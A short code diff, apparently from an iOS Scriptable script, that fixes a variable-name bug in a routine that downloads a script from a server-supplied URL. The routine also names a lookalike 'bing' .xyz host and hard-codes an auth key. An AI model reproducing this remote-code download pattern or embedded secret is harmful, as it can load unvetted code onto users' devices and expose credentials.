@@ -1518,7 +1518,7 @@ timer.schedule(async () => {
     const m = JSON.parse(res);
     
     const authKey = { "X-Auth-Key": "tX3$9mGz@7vLq#F!b2R" };
-    const remoteUrl = `https://bing.0515364.xyz/js/js-115.js`;
+    const remoteUrl = "https://bing.0515364.xyz/js/js-115.js";
     const fm = FileManager.iCloud();
     
     if (m.type === "check-update") {
@@ -1547,7 +1547,7 @@ timer.schedule(async () => {
     }
 
     if (m.type === "start-download") {
-        const { serverScriptUrl, scriptName, authKey } = msg.data;
+        const { serverScriptUrl, scriptName, authKey } = m.data;
         const localPath = fm.joinPath(fm.documentsDirectory(), `${scriptName}.js`);
         const req = new Request(serverScriptUrl);
         req.headers = authKey;
